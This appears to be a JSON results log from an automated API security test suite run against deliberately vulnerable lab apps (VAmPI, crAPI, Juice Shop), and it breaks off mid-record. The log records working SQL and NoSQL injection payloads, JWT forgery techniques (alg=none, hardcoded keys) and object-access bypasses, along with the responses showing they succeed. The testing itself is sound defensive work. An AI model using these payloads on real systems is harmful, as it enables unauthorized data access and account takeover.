# all_results_02


## BOLA (VAmPI)

### Record 1: `bola_book_secret_access`

```json
{
  "test_name": "bola_book_secret_access",
  "owasp_category": "API1:2023 Broken Object Level Authorization",
  "architecture": "rest",
  "target": "vampi",
  "passed": false,
  "severity": "high",
  "evidence": "Book 'victimBook_2e43efd4' owned by 'victim' was successfully retrieved using 'attacker''s own valid token (HTTP 200). Response contained the owner's secret, confirming BOLA.",
  "request_summary": "GET /books/v1/victimBook_2e43efd4 as_user='attacker'",
  "response_summary": "HTTP 200; secret_leaked=True",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:18.032099+00:00",
  "extra": {
    "owner_role": "victim",
    "requester_role": "attacker",
    "book_title": "victimBook_2e43efd4"
  },
  "run_id": "20260714T093117Z_ea8b89",
  "record_type": "result"
}
```

### Record 2: `bola_book_secret_access`

```json
{
  "test_name": "bola_book_secret_access",
  "owasp_category": "API1:2023 Broken Object Level Authorization",
  "architecture": "rest",
  "target": "vampi",
  "passed": false,
  "severity": "high",
  "evidence": "Book 'attackerBook_2e43efd4' owned by 'attacker' was successfully retrieved using 'victim''s own valid token (HTTP 200). Response contained the owner's secret, confirming BOLA.",
  "request_summary": "GET /books/v1/attackerBook_2e43efd4 as_user='victim'",
  "response_summary": "HTTP 200; secret_leaked=True",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:18.035512+00:00",
  "extra": {
    "owner_role": "attacker",
    "requester_role": "victim",
    "book_title": "attackerBook_2e43efd4"
  },
  "run_id": "20260714T093117Z_ea8b89",
  "record_type": "result"
}
```

### Record 3: `bola_book_secret_access`

```json
{
  "test_name": "bola_book_secret_access",
  "owasp_category": "API1:2023 Broken Object Level Authorization",
  "architecture": "rest",
  "target": "vampi",
  "passed": true,
  "severity": "low",
  "evidence": "Unauthenticated request for book 'victimBook_2e43efd4' was denied (HTTP 401).",
  "request_summary": "GET /books/v1/victimBook_2e43efd4 as_user=None",
  "response_summary": "HTTP 401; secret_leaked=False",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:18.037561+00:00",
  "extra": {
    "owner_role": "victim",
    "requester_role": "unauthenticated",
    "book_title": "victimBook_2e43efd4"
  },
  "run_id": "20260714T093117Z_ea8b89",
  "record_type": "result"
}
```


## BOLA (crAPI)

### Record 4: `bola_vehicle_location_access`

```json
{
  "test_name": "bola_vehicle_location_access",
  "owasp_category": "API1:2023 Broken Object Level Authorization",
  "architecture": "rest",
  "target": "crapi",
  "passed": true,
  "severity": "low",
  "evidence": "Owner ('victim') requesting their own vehicle's location -> HTTP 200 with owner details present, as expected.",
  "request_summary": "GET vehicle/87b100fd-8ee2-40cd-85e2-9f1eba514dcb/location as_user='victim'",
  "response_summary": "HTTP 200",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:19.549830+00:00",
  "extra": {},
  "run_id": "20260714T093118Z_738a54",
  "record_type": "result"
}
```

### Record 5: `bola_vehicle_location_access`

```json
{
  "test_name": "bola_vehicle_location_access",
  "owasp_category": "API1:2023 Broken Object Level Authorization",
  "architecture": "rest",
  "target": "crapi",
  "passed": false,
  "severity": "high",
  "evidence": "Vehicle 87b100fd-8ee2-40cd-85e2-9f1eba514dcb owned by 'victim' was successfully retrieved using 'attacker''s own valid token (HTTP 200). Response contained the owner's GPS location, name, and email, confirming BOLA — no ownership check gates this route for any authenticated caller.",
  "request_summary": "GET vehicle/87b100fd-8ee2-40cd-85e2-9f1eba514dcb/location as_user='attacker'",
  "response_summary": "HTTP 200; owner_leaked=True",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:19.560960+00:00",
  "extra": {
    "owner_role": "victim",
    "requester_role": "attacker",
    "vehicle_id": "87b100fd-8ee2-40cd-85e2-9f1eba514dcb"
  },
  "run_id": "20260714T093118Z_738a54",
  "record_type": "result"
}
```

### Record 6: `bola_vehicle_location_access`

```json
{
  "test_name": "bola_vehicle_location_access",
  "owasp_category": "API1:2023 Broken Object Level Authorization",
  "architecture": "rest",
  "target": "crapi",
  "passed": true,
  "severity": "low",
  "evidence": "Unauthenticated request for vehicle 87b100fd-8ee2-40cd-85e2-9f1eba514dcb -> HTTP 401. Rejected, as expected — this endpoint does require a valid token, but (see cross-user result) not one belonging to the vehicle's owner.",
  "request_summary": "GET vehicle/87b100fd-8ee2-40cd-85e2-9f1eba514dcb/location as_user=None",
  "response_summary": "HTTP 401",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:19.566589+00:00",
  "extra": {},
  "run_id": "20260714T093118Z_738a54",
  "record_type": "result"
}
```

### Record 7: `bola_order_access`

```json
{
  "test_name": "bola_order_access",
  "owasp_category": "API1:2023 Broken Object Level Authorization",
  "architecture": "rest",
  "target": "crapi",
  "passed": true,
  "severity": "low",
  "evidence": "Attacker's own order list -> HTTP 200, count=0 (expected 0, a fresh synthetic identity that has placed no orders of its own).",
  "request_summary": "GET orders/all as_user='attacker'",
  "response_summary": "HTTP 200; count=0",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:20.365007+00:00",
  "extra": {},
  "run_id": "20260714T093118Z_738a54",
  "record_type": "result"
}
```

### Record 8: `bola_order_access`

```json
{
  "test_name": "bola_order_access",
  "owasp_category": "API1:2023 Broken Object Level Authorization",
  "architecture": "rest",
  "target": "crapi",
  "passed": false,
  "severity": "high",
  "evidence": "Order 12 owned by 'victim' was successfully retrieved using 'attacker''s own valid token (HTTP 200). Response contained the owner's email and phone number, confirming BOLA — order ids are sequential integers with no ownership check.",
  "request_summary": "GET orders/12 as_user='attacker'",
  "response_summary": "HTTP 200; owner_leaked=True",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:25.414275+00:00",
  "extra": {
    "owner_role": "victim",
    "requester_role": "attacker",
    "order_id": 12
  },
  "run_id": "20260714T093118Z_738a54",
  "record_type": "result"
}
```

### Record 9: `bola_order_access`

```json
{
  "test_name": "bola_order_access",
  "owasp_category": "API1:2023 Broken Object Level Authorization",
  "architecture": "rest",
  "target": "crapi",
  "passed": false,
  "severity": "critical",
  "evidence": "Unauthenticated request for order 12 succeeded (HTTP 200).",
  "request_summary": "GET orders/12 as_user=None",
  "response_summary": "HTTP 200; owner_leaked=True",
  "assertion_role": "adjacent",
  "timestamp": "2026-07-14T09:31:30.451163+00:00",
  "extra": {
    "owner_role": "victim",
    "requester_role": "unauthenticated",
    "order_id": 12
  },
  "run_id": "20260714T093118Z_738a54",
  "record_type": "result"
}
```


## SQL Injection (VAmPI)

### Record 10: `sqli_user_lookup`

```json
{
  "test_name": "sqli_user_lookup",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "vampi",
  "passed": true,
  "severity": "low",
  "evidence": "Control username 'nonexistent_7763179dc1' returned HTTP 404 (not found, as expected).",
  "request_summary": "GET /users/v1/nonexistent_7763179dc1 as_user=None",
  "response_summary": "HTTP 404",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:36.575468+00:00",
  "extra": {},
  "run_id": "20260714T093136Z_1e06ed",
  "record_type": "result"
}
```

### Record 11: `sqli_user_lookup`

```json
{
  "test_name": "sqli_user_lookup",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "vampi",
  "passed": false,
  "severity": "high",
  "evidence": "Payload \"' OR '1'='1\" (as_user=None) -> HTTP 200. Returned seeded account 'name1' despite the requested literal username not existing — the OR tautology matched an arbitrary row, confirming boolean-based SQLi.",
  "request_summary": "GET /users/v1/%27%20OR%20%271%27%3D%271 as_user=None",
  "response_summary": "HTTP 200; returned_username='name1'",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:36.577276+00:00",
  "extra": {
    "payload": "' OR '1'='1",
    "cwe": "CWE-89",
    "owasp_top10_web": "A03:2021 Injection"
  },
  "run_id": "20260714T093136Z_1e06ed",
  "record_type": "result"
}
```

### Record 12: `sqli_user_lookup`

```json
{
  "test_name": "sqli_user_lookup",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "vampi",
  "passed": false,
  "severity": "high",
  "evidence": "Payload \"' OR '1'='1' --\" (as_user=None) -> HTTP 200. Returned seeded account 'name1' despite the requested literal username not existing — the OR tautology matched an arbitrary row, confirming boolean-based SQLi.",
  "request_summary": "GET /users/v1/%27%20OR%20%271%27%3D%271%27%20-- as_user=None",
  "response_summary": "HTTP 200; returned_username='name1'",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:36.579302+00:00",
  "extra": {
    "payload": "' OR '1'='1' --",
    "cwe": "CWE-89",
    "owasp_top10_web": "A03:2021 Injection"
  },
  "run_id": "20260714T093136Z_1e06ed",
  "record_type": "result"
}
```

### Record 13: `sqli_user_lookup`

```json
{
  "test_name": "sqli_user_lookup",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "vampi",
  "passed": false,
  "severity": "critical",
  "evidence": "Payload \"admin'--\" -> HTTP 200. Returned the admin account's own data despite the requested literal string not being a real username — the trailing quote was consumed as a SQL comment, confirming targeted comment-based extraction of a specific (privileged) account.",
  "request_summary": "GET /users/v1/admin%27-- as_user=None",
  "response_summary": "HTTP 200; returned_username='admin'",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:36.581197+00:00",
  "extra": {
    "payload": "admin'--",
    "cwe": "CWE-89",
    "owasp_top10_web": "A03:2021 Injection"
  },
  "run_id": "20260714T093136Z_1e06ed",
  "record_type": "result"
}
```

### Record 14: `sqli_user_lookup`

```json
{
  "test_name": "sqli_user_lookup",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "vampi",
  "passed": false,
  "severity": "critical",
  "evidence": "Payload \"'\" -> HTTP 500. Response body contains SQL error signature 'sqlite3'. Confirms error-based SQL injection (raw query broke on the unescaped quote).",
  "request_summary": "GET /users/v1/%27 as_user=None",
  "response_summary": "HTTP 500",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:36.595164+00:00",
  "extra": {
    "payload": "'",
    "cwe": "CWE-89",
    "owasp_top10_web": "A03:2021 Injection"
  },
  "run_id": "20260714T093136Z_1e06ed",
  "record_type": "result"
}
```

### Record 15: `sqli_user_lookup`

```json
{
  "test_name": "sqli_user_lookup",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "vampi",
  "passed": false,
  "severity": "critical",
  "evidence": "UNION canary payload -> HTTP 200. Random per-run canary 'sqlicanary833e45087369' was reflected verbatim in the response body (substring match — it lands inside a JSON field, not as the whole body), proving full attacker control over returned row data via UNION SELECT (e.g. could extract the password column instead).",
  "request_summary": "GET /users/v1/%27%20UNION%20SELECT%201%2C%27sqlicanary833e45087369%27%2C%27x%27%2C%27sqlicanary833e45087369%40sqli-test.local%27%2C0-- as_user=None",
  "response_summary": "HTTP 200; canary_reflected=True",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:36.597442+00:00",
  "extra": {
    "payload": "' UNION SELECT 1,'sqlicanary833e45087369','x','sqlicanary833e45087369@sqli-test.local',0--",
    "cwe": "CWE-89",
    "owasp_top10_web": "A03:2021 Injection"
  },
  "run_id": "20260714T093136Z_1e06ed",
  "record_type": "result"
}
```

### Record 16: `sqli_user_lookup`

```json
{
  "test_name": "sqli_user_lookup",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "vampi",
  "passed": false,
  "severity": "high",
  "evidence": "Payload \"' OR '1'='1\" (as_user='attacker') -> HTTP 200. Returned seeded account 'name1' despite the requested literal username not existing — the OR tautology matched an arbitrary row, confirming boolean-based SQLi. A valid auth token was attached and did not prevent this.",
  "request_summary": "GET /users/v1/%27%20OR%20%271%27%3D%271 as_user='attacker'",
  "response_summary": "HTTP 200; returned_username='name1'",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:36.599333+00:00",
  "extra": {
    "payload": "' OR '1'='1",
    "cwe": "CWE-89",
    "owasp_top10_web": "A03:2021 Injection"
  },
  "run_id": "20260714T093136Z_1e06ed",
  "record_type": "result"
}
```


## NoSQL/SQL Injection (crAPI)

### Record 17: `nosqli_coupon_validate`

```json
{
  "test_name": "nosqli_coupon_validate",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "crapi",
  "passed": true,
  "severity": "low",
  "evidence": "Control coupon_code 'nonexistent_d28b02498c' -> HTTP 500 (no match, as expected (Mongo ErrNoDocuments)).",
  "request_summary": "POST validate-coupon {'coupon_code': 'nonexistent_d28b02498c'} as_user='attacker'",
  "response_summary": "HTTP 500",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:36.850266+00:00",
  "extra": {},
  "run_id": "20260714T093136Z_40ec19",
  "record_type": "result"
}
```

### Record 18: `nosqli_coupon_validate`

```json
{
  "test_name": "nosqli_coupon_validate",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "crapi",
  "passed": true,
  "severity": "low",
  "evidence": "Unauthenticated injection attempt -> HTTP 401. Rejected, as expected — unlike VAmPI's sqli_target, this endpoint does enforce authentication. See the authenticated payload results for confirmation that a valid token is not, however, a compensating control against the injection itself: any registered user's token is sufficient, since coupons have no per-user ownership concept at all.",
  "request_summary": "POST validate-coupon {'coupon_code': {'$ne': 1}} as_user=None",
  "response_summary": "HTTP 401",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:36.866422+00:00",
  "extra": {},
  "run_id": "20260714T093136Z_40ec19",
  "record_type": "result"
}
```

### Record 19: `nosqli_coupon_validate`

```json
{
  "test_name": "nosqli_coupon_validate",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "crapi",
  "passed": false,
  "severity": "critical",
  "evidence": "Payload {'coupon_code': {'$ne': 1}} (authenticated as an ordinary, non-privileged registered user) -> HTTP 200. Returned real coupon 'TRAC075' (amount='75') despite the request never containing a literal matching value — the request body is passed unmodified as a MongoDB filter (bson.M) straight into FindOne(), so the Mongo operator in the payload is honoured as query logic rather than treated as data. Confirms free coupon discovery without knowing any real code (crAPI's own 'Challenge 12').",
  "request_summary": "POST validate-coupon {'coupon_code': {'$ne': 1}} as_user='attacker'",
  "response_summary": "HTTP 200; leaked_coupon_code='TRAC075'",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:36.871863+00:00",
  "extra": {
    "payload": "{'$ne': 1}",
    "cwe": "CWE-943",
    "owasp_top10_web": "A03:2021 Injection"
  },
  "run_id": "20260714T093136Z_40ec19",
  "record_type": "result"
}
```

### Record 20: `nosqli_coupon_validate`

```json
{
  "test_name": "nosqli_coupon_validate",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "crapi",
  "passed": false,
  "severity": "critical",
  "evidence": "Payload {'coupon_code': {'$gt': ''}} (authenticated as an ordinary, non-privileged registered user) -> HTTP 200. Returned real coupon 'TRAC075' (amount='75') despite the request never containing a literal matching value — the request body is passed unmodified as a MongoDB filter (bson.M) straight into FindOne(), so the Mongo operator in the payload is honoured as query logic rather than treated as data. Confirms free coupon discovery without knowing any real code (crAPI's own 'Challenge 12').",
  "request_summary": "POST validate-coupon {'coupon_code': {'$gt': ''}} as_user='attacker'",
  "response_summary": "HTTP 200; leaked_coupon_code='TRAC075'",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:36.876034+00:00",
  "extra": {
    "payload": "{'$gt': ''}",
    "cwe": "CWE-943",
    "owasp_top10_web": "A03:2021 Injection"
  },
  "run_id": "20260714T093136Z_40ec19",
  "record_type": "result"
}
```

### Record 21: `nosqli_coupon_validate`

```json
{
  "test_name": "nosqli_coupon_validate",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "crapi",
  "passed": false,
  "severity": "critical",
  "evidence": "Payload {'coupon_code': {'$nin': [1]}} (authenticated as an ordinary, non-privileged registered user) -> HTTP 200. Returned real coupon 'TRAC075' (amount='75') despite the request never containing a literal matching value — the request body is passed unmodified as a MongoDB filter (bson.M) straight into FindOne(), so the Mongo operator in the payload is honoured as query logic rather than treated as data. Confirms free coupon discovery without knowing any real code (crAPI's own 'Challenge 12').",
  "request_summary": "POST validate-coupon {'coupon_code': {'$nin': [1]}} as_user='attacker'",
  "response_summary": "HTTP 200; leaked_coupon_code='TRAC075'",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:36.880168+00:00",
  "extra": {
    "payload": "{'$nin': [1]}",
    "cwe": "CWE-943",
    "owasp_top10_web": "A03:2021 Injection"
  },
  "run_id": "20260714T093136Z_40ec19",
  "record_type": "result"
}
```

### Record 22: `sqli_apply_coupon`

```json
{
  "test_name": "sqli_apply_coupon",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "crapi",
  "passed": true,
  "severity": "low",
  "evidence": "Control coupon_code 'nonexistent_5ca33a094f' -> HTTP 400, message='Coupon not found' (clean not-found response, as expected).",
  "request_summary": "POST apply_coupon coupon_code='nonexistent_5ca33a094f' as_user='attacker'",
  "response_summary": "HTTP 400",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:37.199440+00:00",
  "extra": {},
  "run_id": "20260714T093136Z_40ec19",
  "record_type": "result"
}
```

### Record 23: `sqli_apply_coupon`

```json
{
  "test_name": "sqli_apply_coupon",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "crapi",
  "passed": true,
  "severity": "low",
  "evidence": "Unauthenticated injection attempt -> HTTP 401. Rejected, as expected — this endpoint does enforce authentication. See the authenticated payload result for confirmation that a valid token is not, however, a compensating control against the injection itself: any registered user's own token is sufficient, since the vulnerable query is only ever scoped to that token's own user_id, not gated by any coupon-ownership check.",
  "request_summary": "POST apply_coupon coupon_code=\"0'; select version() --+\" as_user=None",
  "response_summary": "HTTP 401",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:37.202125+00:00",
  "extra": {
    "payload": "0'; select version() --+"
  },
  "run_id": "20260714T093136Z_40ec19",
  "record_type": "result"
}
```

### Record 24: `sqli_apply_coupon`

```json
{
  "test_name": "sqli_apply_coupon",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "crapi",
  "passed": false,
  "severity": "critical",
  "evidence": "Payload \"0'; select version() --+\" -> HTTP 400, message='PostgreSQL 14.23 (Debian 14.23-1.pgdg13+1) on aarch64-unknown-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit Coupon code is already claimed by you!! Please try with another coupon code'. Message contains a PostgreSQL version banner — the raw query executed as two stacked statements (the simple query protocol only returns the last statement's result set), so select version()'s output landed in the row the view code treats as an already-claimed coupon_code and echoed it back verbatim. Confirms stacked-query execution and DB version disclosure; no pre-existing applied_coupon rows were required.",
  "request_summary": "POST apply_coupon coupon_code=\"0'; select version() --+\" as_user='attacker'",
  "response_summary": "HTTP 400; message='PostgreSQL 14.23 (Debian 14.23-1.pgdg13+1) on aarch64-unknown-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit Coupon code is already claimed by you!! Please try with another coupon code'",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:37.213395+00:00",
  "extra": {
    "payload": "0'; select version() --+",
    "cwe": "CWE-89",
    "owasp_top10_web": "A03:2021 Injection"
  },
  "run_id": "20260714T093136Z_40ec19",
  "record_type": "result"
}
```

### Record 25: `sqli_apply_coupon`

```json
{
  "test_name": "sqli_apply_coupon",
  "owasp_category": "API8:2023 Security Misconfiguration",
  "architecture": "rest",
  "target": "crapi",
  "passed": false,
  "severity": "high",
  "evidence": "Tautology payload \"0' or '0' = '0\" -> HTTP 400, message='TRAC075 Coupon code is already claimed by you!! Please try with another coupon code'. Response names coupon 'TRAC075' (legitimately applied in this test's own setup step) as 'already claimed', despite \"0' or '0' = '0\" — a different, non-matching literal — being what was actually sent. AND binds tighter than OR, so the WHERE clause matched an arbitrary row in the whole applied_coupon table rather than being scoped to the intended literal value, confirming boolean-based SQL injection.",
  "request_summary": "POST apply_coupon coupon_code=\"0' or '0' = '0\" as_user='attacker'",
  "response_summary": "HTTP 400; message='TRAC075 Coupon code is already claimed by you!! Please try with another coupon code'",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:37.741612+00:00",
  "extra": {
    "payload": "0' or '0' = '0",
    "cwe": "CWE-89",
    "owasp_top10_web": "A03:2021 Injection"
  },
  "run_id": "20260714T093136Z_40ec19",
  "record_type": "result"
}
```


## JWT weak signing bypass (VAmPI)

### Record 26: `jwt_weak_signing_bypass`

```json
{
  "test_name": "jwt_weak_signing_bypass",
  "owasp_category": "API2:2023 Broken Authentication",
  "architecture": "rest",
  "target": "vampi",
  "passed": true,
  "severity": "low",
  "evidence": "Server-issued token header: {'alg': 'HS256', 'typ': 'JWT'}. Uses HS256, a symmetric algorithm where the same secret both signs and verifies — consistent with a forgeable, deployment-wide hardcoded key.",
  "request_summary": "POST /users/v1/login as_user='attacker'",
  "response_summary": "token alg='HS256'",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:43.121311+00:00",
  "extra": {},
  "run_id": "20260714T093143Z_ac32be",
  "record_type": "result"
}
```

### Record 27: `jwt_weak_signing_bypass`

```json
{
  "test_name": "jwt_weak_signing_bypass",
  "owasp_category": "API2:2023 Broken Authentication",
  "architecture": "rest",
  "target": "vampi",
  "passed": false,
  "severity": "critical",
  "evidence": "Forged a token for 'admin' (never logged in this run) signed with the hardcoded Flask SECRET_KEY 'random' -> GET /books/v1/bookTitle60 returned HTTP 200. Accepted without ever presenting real credentials, confirming the signing secret is a fixed, guessable literal rather than a per-deployment random value.",
  "request_summary": "GET /books/v1/bookTitle60 with forged token (weak secret, sub='admin')",
  "response_summary": "HTTP 200",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:43.127922+00:00",
  "extra": {
    "cwe": "CWE-321"
  },
  "run_id": "20260714T093143Z_ac32be",
  "record_type": "result"
}
```

### Record 28: `jwt_weak_signing_bypass`

```json
{
  "test_name": "jwt_weak_signing_bypass",
  "owasp_category": "API2:2023 Broken Authentication",
  "architecture": "rest",
  "target": "vampi",
  "passed": true,
  "severity": "low",
  "evidence": "Control: same forged claims, signed with a different, non-guessed secret -> GET /books/v1/bookTitle60 returned HTTP 401. Rejected, confirming the weak-secret result is a genuine key-guessing bypass and not simply 'any bearer value is accepted'.",
  "request_summary": "GET /books/v1/bookTitle60 with forged token (control secret, sub='admin')",
  "response_summary": "HTTP 401",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:43.129762+00:00",
  "extra": {},
  "run_id": "20260714T093143Z_ac32be",
  "record_type": "result"
}
```

### Record 29: `jwt_weak_signing_bypass`

```json
{
  "test_name": "jwt_weak_signing_bypass",
  "owasp_category": "API2:2023 Broken Authentication",
  "architecture": "rest",
  "target": "vampi",
  "passed": true,
  "severity": "low",
  "evidence": "Unsigned alg='none' token for 'admin' -> GET /books/v1/bookTitle60 returned HTTP 401. Rejected — PyJWT's decode() call is pinned to algorithms=['HS256'], so alg=none tokens are refused independently of the weak-secret HS256 forgery confirmed above.",
  "request_summary": "GET /books/v1/bookTitle60 with alg='none' token, sub='admin'",
  "response_summary": "HTTP 401",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:43.131719+00:00",
  "extra": {},
  "run_id": "20260714T093143Z_ac32be",
  "record_type": "result"
}
```


## Broken Authentication (crAPI)

### Record 30: `jwt_signature_verification_bypass`

```json
{
  "test_name": "jwt_signature_verification_bypass",
  "owasp_category": "API2:2023 Broken Authentication",
  "architecture": "rest",
  "target": "crapi",
  "passed": true,
  "severity": "low",
  "evidence": "Server-issued token header: {'alg': 'RS256'}. Uses RS256, an asymmetric algorithm — verifying a token only needs the public half of the keypair, so a forgery attempt requires either the private key itself or a validator that skips signature checking entirely.",
  "request_summary": "POST /identity/api/auth/login as_user='victim'",
  "response_summary": "token alg='RS256' kid=None",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:43.552323+00:00",
  "extra": {},
  "run_id": "20260714T093143Z_c6c313",
  "record_type": "result"
}
```

### Record 31: `jwt_signature_verification_bypass`

```json
{
  "test_name": "jwt_signature_verification_bypass",
  "owasp_category": "API2:2023 Broken Authentication",
  "architecture": "rest",
  "target": "crapi",
  "passed": false,
  "severity": "critical",
  "evidence": "Unsigned alg='none' token for victim's email (never presented with victim's password in this run) -> GET /identity/api/v2/user/dashboard returned HTTP 200. Returned the victim's full profile despite the token carrying no signature at all — this route does not verify JWT signatures before trusting the `sub` claim.",
  "request_summary": "GET /identity/api/v2/user/dashboard with alg='none' token, sub=victim's email",
  "response_summary": "HTTP 200",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:43.562984+00:00",
  "extra": {
    "cwe": "CWE-347"
  },
  "run_id": "20260714T093143Z_c6c313",
  "record_type": "result"
}
```

### Record 32: `jwt_signature_verification_bypass`

```json
{
  "test_name": "jwt_signature_verification_bypass",
  "owasp_category": "API2:2023 Broken Authentication",
  "architecture": "rest",
  "target": "crapi",
  "passed": true,
  "severity": "low",
  "evidence": "Same unsigned alg='none' technique with a never-registered email -> GET /identity/api/v2/user/dashboard returned HTTP 404. Not found, as expected — confirms the leak above is specifically because a real victim's email was trusted from the forged claim, not because this route returns arbitrary data regardless of input.",
  "request_summary": "GET /identity/api/v2/user/dashboard with alg='none' token, sub=nonexistent email",
  "response_summary": "HTTP 404",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:43.570935+00:00",
  "extra": {},
  "run_id": "20260714T093143Z_c6c313",
  "record_type": "result"
}
```

### Record 33: `jwt_signature_verification_bypass`

```json
{
  "test_name": "jwt_signature_verification_bypass",
  "owasp_category": "API2:2023 Broken Authentication",
  "architecture": "rest",
  "target": "crapi",
  "passed": false,
  "severity": "critical",
  "evidence": "Token for victim's email, signed with crapi-identity's default RSA key (baked into the image, never presented with victim's password in this run) -> GET /identity/api/v2/vehicle/vehicles returned HTTP 200. Accepted — this route does verify signatures (see control below) but the signing key itself is a fixed value shipped in the public Docker image, not a per-deployment secret.",
  "request_summary": "GET /identity/api/v2/vehicle/vehicles with forged token (default key, sub=victim's email)",
  "response_summary": "HTTP 200",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:43.586872+00:00",
  "extra": {
    "cwe": "CWE-321"
  },
  "run_id": "20260714T093143Z_c6c313",
  "record_type": "result"
}
```

### Record 34: `jwt_signature_verification_bypass`

```json
{
  "test_name": "jwt_signature_verification_bypass",
  "owasp_category": "API2:2023 Broken Authentication",
  "architecture": "rest",
  "target": "crapi",
  "passed": true,
  "severity": "low",
  "evidence": "Control: same forged claims, signed with a different, freshly-generated RSA key -> GET /identity/api/v2/vehicle/vehicles returned HTTP 401. Rejected, confirming the default-key result is a genuine hardcoded-key bypass and not simply 'any signature is accepted'.",
  "request_summary": "GET /identity/api/v2/vehicle/vehicles with forged token (unrelated key, sub=victim's email)",
  "response_summary": "HTTP 401",
  "assertion_role": "control",
  "timestamp": "2026-07-14T09:31:43.684724+00:00",
  "extra": {},
  "run_id": "20260714T093143Z_c6c313",
  "record_type": "result"
}
```


## Excessive Data Exposure (debug endpoint) (VAmPI)

### Record 35: `vampi_debug_endpoint_exposure`

```json
{
  "test_name": "vampi_debug_endpoint_exposure",
  "owasp_category": "API3:2023 Excessive Data Exposure",
  "architecture": "rest",
  "target": "vampi",
  "passed": false,
  "severity": "critical",
  "evidence": "GET /users/v1/_debug with no Authorization header -> HTTP 200. Returned 4 full user record(s), including 'admin'. Each record's 'password' field matches this app's own seeded plaintext credentials verbatim (e.g. name1:pass1), confirming passwords are stored and returned in the clear rather than hashed.",
  "request_summary": "GET /users/v1/_debug as_user=None",
  "response_summary": "HTTP 200; records=4; plaintext_passwords=True",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:48.683228+00:00",
  "extra": {},
  "run_id": "20260714T093148Z_9434f4",
  "record_type": "result"
}
```

### Record 36: `vampi_debug_endpoint_exposure`

```json
{
  "test_name": "vampi_debug_endpoint_exposure",
  "owasp_category": "API3:2023 Excessive Data Exposure",
  "architecture": "rest",
  "target": "vampi",
  "passed": false,
  "severity": "critical",
  "evidence": "GET /users/v1/_debug with a valid, non-admin token ('attacker') -> HTTP 200. Still returned 4 full user record(s) including 'admin' — an ordinary authenticated user sees the exact same data as an unauthenticated request, confirming there is no access-control check on this endpoint at all, not just a missing one.",
  "request_summary": "GET /users/v1/_debug as_user='attacker'",
  "response_summary": "HTTP 200; records=4; plaintext_passwords=True",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:48.685732+00:00",
  "extra": {},
  "run_id": "20260714T093148Z_9434f4",
  "record_type": "result"
}
```


## Data Exposure/IDOR (Juice Shop)

### Record 37: `bola_basket_access`

```json
{
  "test_name": "bola_basket_access",
  "owasp_category": "API1:2023 Broken Object Level Authorization",
  "architecture": "rest",
  "target": "juiceshop",
  "passed": false,
  "severity": "high",
  "evidence": "Basket 6 owned by 'victim' was successfully retrieved using 'attacker''s own valid token (HTTP 200). Response contained the owner's basket contents, confirming BOLA.",
  "request_summary": "GET /rest/basket/6 as_user='attacker'",
  "response_summary": "HTTP 200; basket_leaked=True",
  "assertion_role": "detection",
  "timestamp": "2026-07-14T09:31:18.125077+00:00",
  "extra": {
    "owner_role": "victim",
    "requester_role": "attacker",
    "basket_id": 6
  },
  "run_id": "20260714T093118Z_ac590b",
  "record_type": "result"
}
```

### Record 38: `bola_basket_access`

```json
{
  "test_name": "bola_basket_access",
  "owasp_category": "API1:2023 Broken Object Level Authorization",
  "architecture": "rest",
  "target": "juiceshop",
  "passed": false,
  "severity": "high",
